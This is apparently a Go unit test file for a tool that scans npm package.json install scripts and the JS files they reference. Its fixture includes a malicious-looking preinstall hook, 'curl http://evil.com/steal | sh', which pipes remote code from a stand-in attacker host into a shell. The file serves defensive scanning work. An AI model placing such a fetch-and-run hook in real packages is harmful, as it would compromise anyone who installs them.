package scanner

import "testing"

func TestParsePackageJSONScripts(t *testing.T) {
	data := []byte(`{
  "name": "evil-pkg",
  "scripts": {
    "preinstall": "curl http://evil.com/steal | sh",
    "postinstall": "node ./post.js",
    "test": "jest",
    "build": "webpack --mode production"
  }
}`)
	scripts, err := parsePackageJSONScripts(data)
	if err != nil {
		t.Fatalf("parsePackageJSONScripts error: %v", err)
	}
	if len(scripts) != 4 {
		t.Fatalf("expected 4 scripts, got %d", len(scripts))
	}
	if scripts["preinstall"] != "curl http://evil.com/steal | sh" {
		t.Errorf("expected preinstall script, got %q", scripts["preinstall"])
	}
}

func TestParsePackageJSONNoScripts(t *testing.T) {
	data := []byte(`{"name": "clean-pkg", "version": "1.0"}`)
	scripts, err := parsePackageJSONScripts(data)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(scripts) != 0 {
		t.Errorf("expected 0 scripts, got %d", len(scripts))
	}
}

func TestParseInvalidJSON(t *testing.T) {
	_, err := parsePackageJSONScripts([]byte(`{invalid`))
	if err == nil {
		t.Error("expected error for invalid JSON")
	}
}

func TestExtractReferencedJSFiles(t *testing.T) {
	scripts := map[string]string{
		"preinstall":  "echo hello",
		"postinstall": "node ./evil.js",
		"build":       "webpack && node scripts/build.js",
	}
	files := extractReferencedJSFiles(scripts)
	if len(files) != 2 {
		t.Fatalf("expected 2 referenced JS files, got %d", len(files))
	}
	if !contains(files, "evil.js") {
		t.Error("expected evil.js in references")
	}
	if !contains(files, "scripts/build.js") {
		t.Error("expected scripts/build.js in references")
	}
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}
